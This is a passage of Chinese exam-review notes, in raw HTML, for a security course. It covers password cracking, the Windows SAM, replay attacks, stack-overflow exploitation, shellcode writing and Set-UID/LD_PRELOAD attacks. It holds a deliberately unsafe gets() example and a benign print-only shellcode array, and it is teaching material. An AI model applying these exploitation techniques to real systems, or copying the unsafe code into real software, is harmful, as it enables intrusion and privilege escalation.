crypt.crypt(&#x27;dees&#x27;,&#x27;$6$a6ftg3SI$&#x27;)  </span><br><span class="line">$6$a6ftg3SI$apRiFL.jDCH7S(omitted)jAPXtcB9oC0</span><br><span class="line"></span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul><p>salt可以防止攻击</p><ul><li>字典攻击<ul><li>把候选词放入词典</li><li>针对目标密码散列尝试每种方法以查找匹配项</li></ul></li><li>彩虹表攻击<ul><li>用于反转加密哈希函数的预计算表</li></ul></li><li>为什么盐会阻止它们？<ul><li>如果目标密码与预计算数据相同，则哈希值将相同</li><li>如果此属性不成立，则所有预计算的数据都将无效</li><li>盐破坏了这种特性</li></ul></li></ul><h3 id="3-3-2-Windows"><a href="#3-3-2-Windows" class="headerlink" title="3.3.2.Windows"></a>3.3.2.Windows</h3><p>Windows口令存储位置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%SystemRoot%         =&gt;           C:\Windows</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%systemroot%system32\config\目录下</span><br><span class="line">%SystemRoot%\repair目录下的SAM._文件</span><br><span class="line">注册表中HKEY_LOCAL_MACHINE\SAM键</span><br><span class="line">Winlogon.exe的内存块中</span><br></pre></td></tr></table></figure><p>SAM文件的安全保护措施：</p><ul><li>Sam文件锁定：在操作系统运行期间，sam文件被system账号 锁定，即使用admin权限也无法访问它；</li><li>隐藏：sam在注册表中的备份是被隐藏的;</li><li>不可读：系统保存sam文件时将sam信息经过压缩处理，因此不具有可读性。</li></ul><hr><p>认证协议——NTLM(NT Lan Manager)</p><ol><li>将口令转换为Unicode字符串</li><li>用MD4对口令进行单向HASH，生成16字节的HASH值，NTLMv2在此基础上增加了双向验证的功能。</li></ol><hr><p>本地获取口令方法：</p><ul><li>获取系统自动保存的口令字：系统将用户的口令保存在硬盘</li><li>直接读取Windows 系统中的登陆口令：系统将用户的口令暂存在内存中</li><li>破解SAM信息</li></ul><hr><p>口令破解原理：尝试用已知算法加密单词，然后对比获取到的结果</p><ul><li>大多数口令破解工具是通过尝试一个一个的单词，用已知的加密算法来加密这些单词，直到发现一个单词经过加密后的结 果和解密的数据一样，就认为这个单词就是要找的密码了。  <ul><li>L0phtcrack</li><li>NTSweep</li><li>NTCrack</li><li>PWDump</li></ul></li></ul><h2 id="3-4-针对口令传输的攻击方法（嗅探攻击、键盘记录、钓鱼、重放）"><a href="#3-4-针对口令传输的攻击方法（嗅探攻击、键盘记录、钓鱼、重放）" class="headerlink" title="3.4.针对口令传输的攻击方法（嗅探攻击、键盘记录、钓鱼、重放）"></a>3.4.针对口令传输的攻击方法（嗅探攻击、键盘记录、钓鱼、重放）</h2><ul><li><p><strong>嗅探攻击：</strong></p><ul><li>如果主机B处于主机A和FTP<strong>通信的信道</strong>上，就可以“窃听到”合法的用户名及口令。</li><li>嗅探的前提条件<ul><li>802.3以太网是一种使用广播信道的网络，在以太网中所有通信都是<strong>广播的</strong>。</li><li>网卡的侦听模式：广播模式、组播模式、普通模式、<strong>混杂模式</strong></li></ul></li></ul></li><li><p><strong>键盘记录：</strong></p><ul><li><strong>硬件截获</strong>：修改主机的键盘接口。</li><li><strong>软件截获</strong>：监视操作系统处理键盘输入的接口，将来自键盘的数据记录下来。</li></ul></li><li><p><strong>钓鱼：</strong></p><p>网络钓鱼（Phishing）就是攻击者利用欺骗性的电子邮件和伪造的Web站点，<strong>骗取</strong>用户输入口令以及其他身份敏感信息。</p></li><li><p><strong>重放：</strong></p><p>攻击者记录下当前的通讯流量，以后在适当的时候重发给通讯的某一方，达到欺骗的目的，包括<strong>简单重放</strong>和<strong>反向重放</strong>。具体过程如下:</p></li></ul><ol><li>主机A向主机B发出资源访问请求，B返回给A一个挑战值Challenge；</li><li>由于A没有B的合法帐号，因此无法计算响应值Response，此时A暂时将会话挂起，等待机会；</li><li>在某一时刻，B向A发出了资源访问请求，于是A将前面获得的Challenge作为自己的挑战值发送给B。</li></ol><blockquote><p>重放攻击(Replay Attack)是一种网络攻击形式，攻击者截取并重放合法用户的通信数据，以伪造或重复之前的合法操作。攻击的核心在于，攻击者利用已经合法通过的认证信息，在未经授权的情况下，重新发送这些信息，伪装成合法用户进行非法操作。</p><p>重放攻击的流程一般如下:</p><ol><li><p>捕获通信数据：攻击者首先拦截合法用户与服务器之间的通信数据，通常这些数据包含认证凭证、会话信息等。</p></li><li><p>分析数据包：攻击者分析截取到的数据包，确定哪些信息是用来认证身份或执行特定操作的。</p></li><li><p>重放数据包：攻击者在稍后重新发送这些截获的数据包，即使这些数据包可能是合法用户发出的，但攻击者重复发送，从而欺骗服务器认为是合法用户再次发起的请求。</p></li><li><p>执行攻击：如果服务器没有采取防重放的安全措施，可能会接受这些数据，并执行攻击者伪装的操作。</p></li></ol></blockquote><h2 id="3-5-口令攻击的防范方法"><a href="#3-5-口令攻击的防范方法" class="headerlink" title="3.5.口令攻击的防范方法"></a>3.5.口令攻击的防范方法</h2><p>选择<strong>安全密码</strong>（设置足够长度的口令；口令中混合使用大小写字母、数字、特殊符号）</p><p>防止口令猜测攻击（硬盘分区采用NTFS格式；正确设置和管理帐户；禁止不需要的服务；关闭不用的端口）</p><blockquote><p>为什么硬盘分区采用NTFS格式能够防范口令加密？</p><p>NTFS文件系统提供了文件和文件夹的加密功能，可以有效地保护数据，防止未授权用户访问；NTFS支持设置详细的权限，可以对文件或文件夹设置用户访问权限，从而增强安全性。</p></blockquote><p>设置<strong>安全策略</strong>（不要将口令告诉他人，也不要在不同系统上使用同一口令；不要将口令记录在别人可以看见的地方；口令应在允许的范围内尽可能取长一点；定期改变口令）</p><h1 id="4-软件漏洞"><a href="#4-软件漏洞" class="headerlink" title="4.软件漏洞"></a>4.软件漏洞</h1><p>重点：<strong>栈溢出实验</strong></p><ul><li>漏洞的定义</li><li>典型漏洞类型（栈溢出、堆溢出、格式化串、整型溢出、释放再使用）</li><li><strong>栈溢出漏洞利用原理</strong>（内存分布、<u>漏洞利用内存变化、压栈&#x2F;出栈、栈溢出原理、</u>）</li><li><strong>溢出漏洞利用原理</strong>（基本流程、<u>关键技术(溢出点定位、覆盖执行控制地址、覆盖异常处理结构、跳转地址的确定、Shellcode定位和跳转</u>）</li><li>ShellCode的定义、作用、如何编写步骤、需要注意事项、通用ShellCode编写方法</li><li>环境变量攻击的原理、Set-UID 概念、攻击案例分析</li></ul><h2 id="4-1-漏洞的定义"><a href="#4-1-漏洞的定义" class="headerlink" title="4.1.漏洞的定义"></a>4.1.漏洞的定义</h2><p>漏洞的定义：指信息系统硬件、软件、操作系统、网络协议、数据库等在设计上、实现上出现的可以被攻击者利用的错误、缺陷和疏漏。 </p><ul><li>通俗一点说，漏洞就是可以被攻击利用的系统弱点</li></ul><hr><blockquote><p>漏洞攻击三步骤：漏洞发现、漏洞分析、漏洞利用（不用看）</p><ul><li>漏洞发现：发现潜在的程序代码漏洞和系统安全机制漏洞</li><li>漏洞分析：通过程序执行调试与上下文环境分析，定位并确定漏洞，记录漏洞发生的执行过程</li><li>漏洞利用：通过<strong>攻击源</strong>、<strong>有效载荷构造</strong>实现系统漏洞的利用和保护机制的突破</li></ul><p>漏洞导致后果：以匿名身份获取系统最高权限、被植入后门、实施远程拒绝服务攻击</p></blockquote><h2 id="4-2-典型漏洞类型"><a href="#4-2-典型漏洞类型" class="headerlink" title="4.2.典型漏洞类型"></a>4.2.典型漏洞类型</h2><p>（栈溢出、堆溢出、格式化串、整型溢出、释放再使用）</p><ul><li>栈溢出（Stack Overflow）<ul><li>如果在堆栈中压入的数据超过预先给堆栈分配的容量时,就会出现堆栈溢出，从而使得程序运行失败;如果发生溢出的是大型程序还有可能会导致系统崩溃。</li></ul></li><li>堆溢出（Heap Overflow）</li><li>格式化串（Format String）</li><li>整型溢出（lnteger Overflow）</li><li>释放再使用（Use after Free）</li></ul><h2 id="4-3-栈溢出漏洞利用原理"><a href="#4-3-栈溢出漏洞利用原理" class="headerlink" title="4.3. 栈溢出漏洞利用原理"></a>4.3. <strong>栈溢出漏洞利用原理</strong></h2><p>（内存分布、<u>漏洞利用内存变化、压栈&#x2F;出栈、栈溢出原理</u>）</p><h3 id="4-3-1-拉通梳理"><a href="#4-3-1-拉通梳理" class="headerlink" title="4.3.1.拉通梳理"></a>4.3.1.拉通梳理</h3><p>![截屏2024-12-28 20.18.38](.&#x2F;attachments&#x2F;截屏2024-12-28 20.18.38.png)</p><p><strong>代码段（.text）</strong>，也称文本段（Text Segment），存放着程序的机器码和只读数据，可执行指令就是从这里取得的，这个段在内存中一般被标记为只读，任何对该区的写操作都会导致段错误（Segmentation Fault）。</p><p><strong>数据段</strong>，包括已初始化的数据段<u>（.data）</u>和未初始化的数据段<u>（. bss）</u>，前者用来存放保存全局的和静态的已初始化变量，后者用来保存全局的和静态的未初始化变量。数据段在编译时分配。</p><p><strong>堆栈段</strong>分为堆和栈</p><ul><li><p>堆（Heap）：位于BSS内存段的上边，用来<u>存储程序运行时</u>分配的变量。堆的大小并不固定，可动态扩张或缩减。其分配由malloc()、new()等这类实时内存分配函数来实现。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。堆的内存释放由应用程序去控制，通常一个new()就要对应一个delete()，如果程序员没有释放掉,那么在程序结束后操作系统会自动回收。</p></li><li><p>栈（Stack）是一种用来<u>存储函数调用</u>时的临时信息的结构，如函数调用所传递的参数、函数的返回地址、函数的局部变量等。在程序运行时由编译器在需要的时候分配，在不需要的时候自动清除。栈的特性是最后一个放入栈中的物体总是被最先拿出来，这个特性通常称为<strong>先进后出</strong>(FILO)队列。</p><ul><li><p>栈的基本操作</p><ul><li>PUSH操作：向栈中添加数据,称为压栈,数据将放置在栈顶；</li><li>POP操作：在栈顶部移去一个元素，并将栈的大小减1，称为弹栈。</li></ul></li><li><p>在使用栈时,引用栈帧需要借助<strong>两个寄存器</strong>。</p><ul><li>一个是<strong>SP(ESP)</strong>，即栈顶指针，它随着数据入栈出栈而发生变化。</li><li>另一个是<strong>BP(EBP)</strong>，即基地址指针，它用于标识栈中一个相对稳定的位置，通过BP，再“加上”偏移地址，可以方便地引用函数参数以及局部变量。</li></ul></li></ul></li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/image-20241228203249431.png" alt="image-20241228203249431" style="zoom: 33%;" /><p>随着函数调用层数的增加，函数栈帧是一块块地向内存低地址方向延伸的。随着进程中函数调用层数的减少，即各函数调用的返回，栈帧一块块地被遗弃而向内存的高址方向回缩。</p><p>各函数的栈帧大小随着函数的性质的不同而不等，由函数的局部变量的数目决定。在溢出中，我们主要关注<strong>数据区和堆栈区</strong>。</p><hr><p><img src="/./attachments/image-20241229164351779.png" alt="image-20241229164351779"></p><table><thead><tr><th>高地址</th><th>传递的参数</th></tr></thead><tbody><tr><td></td><td>退出fun函数后的返回地址RET 即调用fun的下一条指令的地址</td></tr><tr><td></td><td>调用fun函数之前的EBP 也就是上一个函数栈帧的EBP</td></tr><tr><td><strong>低地址 （后入栈）</strong></td><td>函数中的局部变量： buf[10] …… buf[0]</td></tr></tbody></table><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/image-20241228203918996.png" alt="image-20241228203918996" style="zoom: 100%;" /><p>在局部变量的下面（高地址方向），是前一个调用函数的EBP，接下来就是返回地址。如果局部变量发生溢出，很有可能会覆盖掉EBP甚至RET(返回地址)，这就是缓冲区溢出攻击的“奥秘”所在。</p><blockquote><p>如果在堆栈中压入的数据超过预先给堆栈分配的容量时，就会出现堆栈溢出，从而使得程序运行失败；如果发生溢出的是大 型程序还有可能会导致系统崩溃。</p></blockquote><p>程序中发生函数调用时：</p><p>(1)   首先把指令寄存器EIP（它指向当前CPU将要运行的下一条指令的地址）中的内容压入栈，作为程序的返回地址（下文中用RET表示）；</p><p>(2)   之后放入栈的是基址寄存器EBP，它指向当前函数栈帧(stack frame)的底部；</p><p>(3)   然后把当前的栈指针ESP拷贝到EBP，作为新的基地址，最后为本地变量的动态存储分配留出一定空间，并把ESP减去适当的数值。</p><p><strong>栈溢出实例</strong></p><p>一段简单程序的执行过程中对栈的操作和溢出的产生过程。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line">    gets(name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">16</span>&amp;&amp;name[i]; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,name[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译上述代码，输入<code>hello world! </code>结果会输出<code>hello world!</code></p><ul><li><p>在调用main()函数时，程序对栈的操作是这样的:</p><ul><li><p>先在栈底压入返回地址</p></li><li><p>接着将栈指针EBP入栈，并把EBP修改为现在的ESP</p></li><li><p>之后ESP减16，即向上增长16个字节，用来存放name[]数组</p></li></ul></li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-28 21.05.00.png" alt="截屏2024-12-28 21.05.00" style="zoom: 33%;" /><ul><li><p>接着执行for循环，逐个打印name数组中的字符，直到碰到0x00字符</p></li><li><p>最后，从main返回，将ESP增加16以回收name[]数组占用的空间，此时ESP指向先前保存的EBP值。程序将这个值弹出并赋给EBP，使EBP重新指向main()函数调用者的栈的底部。然后再弹出现在位于栈顶的返回地址RET，赋给EIP，CPU继续执行EIP所指向的命令。</p><ul><li><p>说明1：EIP寄存器的内容表示将要执行的下一条指令地址。</p></li><li><p>说明2：当调用函数时，Call指令会将返回地址(Call指令下一条指令地址)压入栈，Ret指令会把压栈的返回地址弹给EIP。</p></li></ul></li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-28 21.05.41.png" alt="截屏2024-12-28 21.05.41" style="zoom: 33%;" /><ul><li><p>由于输入的字符串太长，name[]数组容纳不下，只好向栈的底部方向继续写‘A’。这些‘A’覆盖了堆栈的老的元素，从上页图可以看出，EBP，Ret都已经被‘A’覆盖了。</p></li><li><p>从main返回时，就必然会把‘AAAA’的ASCII码——0x41414141视作返回地址，CPU会试图执行0x41414141处的指令，结果出现难以预料的后果，这样就产生了一次堆栈溢出。</p></li></ul><h3 id="4-3-2-按照要求逐点分析（三种方式）"><a href="#4-3-2-按照要求逐点分析（三种方式）" class="headerlink" title="4.3.2.按照要求逐点分析（三种方式）"></a>4.3.2.按照要求逐点分析（三种方式）</h3><blockquote><p><strong>内存分布</strong>:代码段、数据段、堆栈段</p><p>程序内存由高到低:环境变量及命令行参数——&gt;栈——&gt;堆——&gt;未初始化全局 或静态变量&#x2F;.bss——&gt;初始化全局或静态变量&#x2F;.data——&gt;程序指令和只读数据&#x2F;.text</p><p>栈中内存由高到低:父函数传入子函数的参数(32位，64位使用寄存器传参) ——&gt;子函数的返回地址——&gt;子函数的ebp，存的值是父函数的ebp——&gt;子函数的局部变量</p></blockquote><blockquote><p>堆栈内存中的分布：代码段、数据段、堆栈段 内存由高到低：参数及环境变量–栈–堆–未初始化全局或静态变量–初始化全局或静态变 量–程序指令和只读数据。 栈中由高到低：实参–返回地址–之前EBP–局部变量 随着函数调用层数的增加，函数栈帧是一块块地向内存低地址方向延伸的。 漏洞利用内存变化：自己编</p></blockquote><p><strong>内存分布：</strong>  ![截屏2024-12-28 20.18.38](.&#x2F;attachments&#x2F;截屏2024-12-28 20.18.38.png)</p><p><strong>漏洞利用内存变化：</strong></p><p><img src="/./attachments/image-20241229164344675.png" alt="image-20241229164344675"></p><p>在局部变量的下面（内存高地址方向），是前一个调用函数的EBP，接下来就是返回地址。 </p><p>如果局部变量发生溢出，很有可能会覆盖掉EBP甚至RET(返回地址)，这就是缓冲区溢出攻击的“奥秘”所在。</p><p><strong>压栈&#x2F;出栈：</strong></p><p>栈（Stack）是一种用来存储函数调用时的临时信息的结构，如函数调用所传递的参数、函数的返回地址、函数的局部变量等。</p><ul><li>PUSH操作：向栈中添加数据，称为压栈，数据将放置在栈顶； </li><li>POP操作：POP操作相反，在栈顶部移去一个元素，并将栈的大小减一，称为 弹栈</li></ul><p> <strong>栈溢出原理：</strong></p><p>程序中发生函数调用时：</p><p>(1)   首先把指令寄存器EIP（它指向当前CPU将要运行的下一条指令的地址）中的内容压入栈，作为程序的返回地址（下文中用RET表示）；</p><p>(2)   之后放入栈的是基址寄存器EBP，它指向当前函数栈帧(stack frame)的底部；</p><p>(3)   然后把当前的栈指针ESP拷贝到EBP，作为新的基地址，最后为本地变量的动态存储分配留出一定空间，并把ESP减去适当的数值。</p><p>如果在堆栈中压入的数据超过预先给堆栈分配的容量时，就会出现堆栈溢出，从而使得程序运行失败；如果发生溢出的是大型程序还有可能会导致系统崩溃。</p><h2 id="4-4-溢出漏洞利用原理"><a href="#4-4-溢出漏洞利用原理" class="headerlink" title="4.4.溢出漏洞利用原理"></a>4.4.溢出漏洞利用原理</h2><p>（基本流程、<u>关键技术(溢出点定位、覆盖执行控制地址、覆盖异常处理结构、跳转地址的确定、Shellcode定位和跳转</u>））</p><ul><li><p><strong>基本流程</strong>：注入恶意数据→溢出缓冲区→控制流重定向→执行有效载荷</p><blockquote><p>（1）在哪里注入“溢出”数据？ </p><p>（2）数据要多长才能覆盖返回地址？ </p><p>（3）使用什么内容覆盖返回地址？ </p><p>（4）执行什么样的攻击代码？</p></blockquote></li><li><p><strong>溢出点定位</strong>：（如何确定溢出点位置？）</p><ul><li>探测法：构造数据，根据出错的情况来判断。<img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-29 14.27.02.png" alt="截屏2024-12-29 14.27.02" style="zoom: 33%;" /></li><li>反汇编分析：查看汇编程序进行分析</li></ul></li><li><p><strong>覆盖执行控制地址</strong>包括：覆盖返回地址、覆盖函数指针变量、覆盖异常处理结构</p></li><li><p><strong>覆盖异常处理结构：</strong></p><ul><li>异常处理是一种对程序异常的处理机制，它把错误处理代码与正常情况下所执行的代码分开。</li><li>当程序发生异常时，系统中断当前线程，将控制权交给异常处理程序。</li><li>Windows的异常处理机制称为结构化异常处理（StructuredException Handling）。</li></ul></li><li><p><strong>跳转地址的确定：</strong></p><ul><li><p>跳转指令的选取</p><ul><li>jmp esp、call ebx、call ecx等。</li></ul></li><li><p>跳转指令的搜索范围</p><ul><li><p>用户空间的任意地址、系统dll、进程代码段、PEB、TEB；</p></li><li><p>跳转指令地址的选择规律</p></li></ul></li></ul></li><li><p><strong>Shellcode定位和跳转</strong>：</p><ul><li><p>Nop Sled：类NOP指令填充，可以是NOP，也可以是inc eax等无副作用指令。</p><blockquote><p>NOP指令是一种不执行任何操作的机器语言指令或编程语言语句，常用于计时、对齐、防止危险、占用分支延迟槽等目的</p></blockquote></li><li><p>Decoder：解码部分，对Real_Shellcode解码。</p></li><li><p>Real_Shellcode：真正有意义的shellcode部分，但是经过了编码处理。</p></li></ul></li></ul><p><img src="/./attachments/image-20241229004739294.png" alt="image-20241229004739294"></p><p>原理：本来是恢复ebp然后跳转到返回值继续执行，但覆盖后可能执行其他错误的有意义的操作</p><p>![截屏2024-12-29 15.08.06](.&#x2F;attachments&#x2F;截屏2024-12-29 15.08.06.png)</p><h2 id="4-5-ShellCode的定义、作用、如何编写步骤、需要注意事项、通用ShellCode编写方法"><a href="#4-5-ShellCode的定义、作用、如何编写步骤、需要注意事项、通用ShellCode编写方法" class="headerlink" title="4.5.ShellCode的定义、作用、如何编写步骤、需要注意事项、通用ShellCode编写方法"></a>4.5.ShellCode的定义、作用、如何编写步骤、需要注意事项、通用ShellCode编写方法</h2><h3 id="4-5-1-shellcode的定义"><a href="#4-5-1-shellcode的定义" class="headerlink" title="4.5.1.shellcode的定义"></a>4.5.1.shellcode的定义</h3><p>ShellCode就是一段能够完成一定功能(比如打开一个命令窗口)、可直接由计算机执行的机器代码，通常以十六进制的形式存在，例如</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = </span><br><span class="line"><span class="string">&quot;\x48\x31\xc0\xb0\x01\x48\x31\xff\x48\xff\xc7\x48\x83\xec\x18\xc6\x04\x24\x48\xc6\x44\x24\x01\x65\xc6\x44\x24\x02\x6c\xc6\x44\x24\x03\x6c\xc6\x44\x24\x04\x6f\xc6\x44\x24\x05\x20\xc6\x44\x24\x06\x53\xc6\x44\x24\x07\x68\xc6\x44\x24\x08\x65\xc6\x44\x24\x09\x6c\xc6\x44\x24\x0a\x6c\xc6\x44\x24\x0b\x20\xc6\x44\x24\x0c\x63\xc6\x44\x24\x0d\x6f\xc6\x44\x24\x0e\x64\xc6\x44\x24\x0f\x65\xc6\x44\x24\x10\x0a\x48\x89\xe6\x48\x31\xd2\xb2\x11\x0f\x05\x48\x31\xc0\xb0\x3c\x31\xff\x0f\x05&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="4-5-2-shellcode的功能"><a href="#4-5-2-shellcode的功能" class="headerlink" title="4.5.2.shellcode的功能"></a>4.5.2.shellcode的功能</h3><ul><li>可以是出于恶作剧弹出对话框 </li><li>打开dos窗口</li><li>添加系统管理用户 </li><li>打开可以远程连接的端口 </li><li>发起反向连接 </li><li>上传（下载）木马病毒并运行 </li><li>可能是攻击性的，删除重要文件、窃取数据 </li><li>破坏，格式化磁盘</li></ul><h3 id="4-5-3-如何编写shellcode-打印字符串"><a href="#4-5-3-如何编写shellcode-打印字符串" class="headerlink" title="4.5.3.如何编写shellcode-打印字符串"></a>4.5.3.如何编写shellcode-打印字符串</h3><ul><li>编写汇编程序“打印字符串”，编译运行</li><li>提取Shellcode并在编写加载器执行</li><li>针对性去除shellcode中的NULL字节</li></ul><h3 id="4-5-3-如何编写shellcode-打开windows对话框"><a href="#4-5-3-如何编写shellcode-打开windows对话框" class="headerlink" title="4.5.3.如何编写shellcode-打开windows对话框"></a>4.5.3.如何编写shellcode-打开windows对话框</h3><ul><li>编写打开windows对话框的C程序，并查看汇编代码</li><li>Windows函数调用原理；（加载（LOAD）函数所在的动态链接库；使用堆栈进行参数传递；调用（CALL）函数地址）<img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-29 16.10.30.png" alt="截屏2024-12-29 16.10.30" style="zoom: 33%;" /></li><li>使用汇编生成ShellCode（\x55格式）：（将“参数”压栈；将“参数”地址压栈；Call MessageBoxA函数地址）<ul><li>将机器码按照“\x55”的格式抄下来就是ShellCode</li></ul></li></ul><h3 id="4-5-4-注意事项"><a href="#4-5-4-注意事项" class="headerlink" title="4.5.4.注意事项"></a>4.5.4.注意事项</h3><ul><li>Push是四个字节对齐的，因此必须每次压栈四个字节或者一个字节一个字节赋值</li><li>shellcode 调用 MessageBox函数后,没有做扫尾工作。</li><li>Shellcode 包含null字节。</li><li>如果user32.dIl没有加载，那个API地址将不会指向MessageBoxA函数，代码将会失败。</li><li>Shellcode包含了一个MessageBoxA函数地址的硬编，不通用。</li></ul><h3 id="4-5-6-通用的shellcode的编写"><a href="#4-5-6-通用的shellcode的编写" class="headerlink" title="4.5.6.通用的shellcode的编写"></a>4.5.6.通用的shellcode的编写</h3><ul><li><p>将每个版本的Windows操作系统所地应的函数的地址列出来，然后针对不同版本的操作系统使用不用的地址;</p></li><li><p>**动态定位函数地址：**使用GetProcAddress和LoadLibrary函数动态获取其它函数的地址。</p><blockquote><p><strong>获取GetProcess和LoadLibrary地址：</strong></p><p>（1）暴力搜索：在内存中查找Kernel32.dll库和GetProcAddress函数的地址。</p><p>（2）使用PEB获取GetProcAddress地址</p><p>（3）SHE获得kernel基址：搜索异常链找到UnhandleExceptionFilter函数，该函数在kernel32.dIl，因此从UnhandleExceptionFilter函数的地址往上找，找到MZ和PE标志就是KerneI32.dl的基地址</p><p>（4）HASH法查找所有函数地址：使用类似查找GetProcAddress函数地址的方法查找其它函数。引入HASH的思想，缩短查到的代码。将各个函数的函数名通过一个简单但较好的HASH算法产生一个定长的hash值，然后进行比较。</p></blockquote></li></ul><h2 id="4-6-环境变量攻击的原理、Set-UID-概念、攻击案例分析"><a href="#4-6-环境变量攻击的原理、Set-UID-概念、攻击案例分析" class="headerlink" title="4.6.环境变量攻击的原理、Set-UID 概念、攻击案例分析"></a>4.6.环境变量攻击的原理、Set-UID 概念、攻击案例分析</h2><p>环境变量的定义：一组动态的定义值、操作系统运行环境的一部分、影响正在运行进程的行为方式（加载哪些外部DLL），在Unix中提出，也被微软操作系统采用。</p><p>示例：PATH变量</p><ul><li>当执行一个程序时，如果没有提供完整的路径，shell进程将使用环境变量来找到程序的位置。</li></ul><h3 id="4-6-1-原理"><a href="#4-6-1-原理" class="headerlink" title="4.6.1.原理"></a>4.6.1.原理</h3><p>由于用户可以设置环境变量，因此它们将成为Set-UID程序的攻击面的一部分。</p><p>fork和execve；envp和environ；shell变量和环境变量</p><h3 id="4-6-2-Set-Uid的概念"><a href="#4-6-2-Set-Uid的概念" class="headerlink" title="4.6.2.Set-Uid的概念"></a>4.6.2.Set-Uid的概念</h3><ul><li>允许用户以程序所有者的权限运行程序</li><li>允许用户以临时提升的权限运行程序</li></ul><blockquote><p>setuid的程序，任何用户执行时，都以setuid程序文件所属的用户的身份运行。</p><p>一般使用场景是，对归属root的程序进行setuid，以便普通用户有root用户的权限。</p></blockquote><ul><li>每个进程都有两个用户ID<ul><li>Real UID （RUID）确定进程的真正所有者</li><li>Effective UID（EUID）标识进程的权限<ul><li>访问控制基于EUID</li></ul></li></ul></li><li>当执行正常程序时，RUID &#x3D; EUID，它们都等于运行程序的用户的ID</li><li>当执行Set-UID时， RUID ≠ EUID。 RUID还是用户ID, 但是EUID是程序owner的ID。 <ul><li>如果程序归root所有，则程序以root权限运行。</li></ul></li></ul><h3 id="4-6-3-攻击案例分析"><a href="#4-6-3-攻击案例分析" class="headerlink" title="4.6.3.攻击案例分析"></a>4.6.3.攻击案例分析</h3><ul><li><p><strong>通过动态链接器攻击</strong>：使用环境变量，它将成为攻击面的一部分，指向在程序中引用的外部库代码，这意味着程序在编译期间未决定部分代码</p><ul><li><p>LD_PRELOAD 包含一个共享库的列表，链接器将首先搜索它；</p></li><li><p><strong>对策</strong>：这是由于动态连接器实现了一个对策。当EUID和RUID不同时，它会忽略LD_PRELOAD和LD_LIBRARY_PATH环境变量。</p><blockquote><p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-29 17.06.23.png" alt="截屏2024-12-29 17.06.23" style="zoom: 33%;" /><code>4755</code> 权限的含义：</p><p><strong>setuid (4)</strong>：<code>4</code> 在最左边的位表示启用了 <strong>setuid</strong> 权限。这意味着当文件被执行时，它会以文件所有者的身份运行，而不是执行者的身份。对于可执行文件，通常用于需要提升权限的程序（如 <code>passwd</code> 命令）。例如，当你运行一个具有 setuid 权限的程序时，它会以程序所有者（通常是 root）的权限执行，而不是你当前用户的权限。</p><p><strong>所有者权限 (7)</strong>：所有者（文件的创建者或拥有者）具有读、写、执行权限（<code>rwx</code>）。</p><p><strong>组权限 (5)</strong>：与文件同组的用户有读和执行权限（<code>r-x</code>）。</p><p><strong>其他用户权限 (5)</strong>：其他所有用户有读和执行权限（<code>r-x</code>）。</p></blockquote></li></ul></li><li><p><strong>通过外部程序攻击</strong>：应用程序本身可能不使用环境变量，但被调用的外部程序可能会使用。如system调用execve，其中参数涉及PATH。</p></li><li><blockquote><p>Shell程序的行为受到许多环境变量的影响，其中最常见的是PATH变量。当shell程序运行一个命令而没有提供绝对路径时，它将使用PATH变量来找到该命令</p></blockquote><ul><li>对策：与system()相比，execve()的攻击面更小。execve()不调用shell，因此不受环境变量的影响。当在特权程序中调用外部程序时，我们应该使用 execve()</li></ul></li><li><p><strong>通过外部库攻击</strong>：程序通常使用来自外部库的函数。如果这些函数使用环境变量，则它们会添加到攻击表面。</p></li><li><p><strong>通过应用程序代码发动攻击</strong>：程序可以直接使用环境变量。如果这些是特权程序，它可能会导致不可信任的输入。</p></li></ul><p><strong>set-uid方法和服务方法（systemd）</strong></p><p>大多数操作系统遵循两种方法，允许正常用户执行特权操作。</p><ul><li>Set-UID方法：普通用户必须<strong>运行一个特殊的程序</strong>才能临时获得根权限</li><li>服务方法：普通用户必须<strong>请求特权服务</strong>才能为他们执行操作。</li></ul><p>Set-UID具有更广泛的攻击面，这是由<strong>环境变量</strong>引起的。</p><ul><li>在Set-UID方法中不能信任环境变量；环境变量在服务方法中可以被信任。</li></ul><p>尽管其他攻击面仍然适用于服务方法，但它被认为比Set-UID方法更安全。</p><p>因此，安卓操作系统完全删除了Set-UID和Set-GID机制</p><h1 id="5-Web应用攻击"><a href="#5-Web应用攻击" class="headerlink" title="5.Web应用攻击"></a>5.Web应用攻击</h1><p>重点：<strong>xss攻击实验</strong></p><ul><li>Web应用基础（架构、基本内容、）</li><li><strong>XSS攻击</strong>（定义、同源策略、<u>危害、代码漏洞分析及利用方法、类型、防范措施</u>）</li><li>SQL注入攻击（定义、类型、注入步骤、提权方法、暴库定义、防范措施）（会考！但是没有很复杂，知道基本的sql注入怎么写就好！）</li><li>HTTP会话攻击及防御（预测会话ID、窃取会话ID、控制会话ID、CSRF攻击、防范措施）（看看ppt）</li></ul><h2 id="5-1-Web应用基础"><a href="#5-1-Web应用基础" class="headerlink" title="5.1.Web应用基础"></a>5.1.Web应用基础</h2><p>（架构、基本内容）</p><h3 id="5-1-2-Web应用的架构"><a href="#5-1-2-Web应用的架构" class="headerlink" 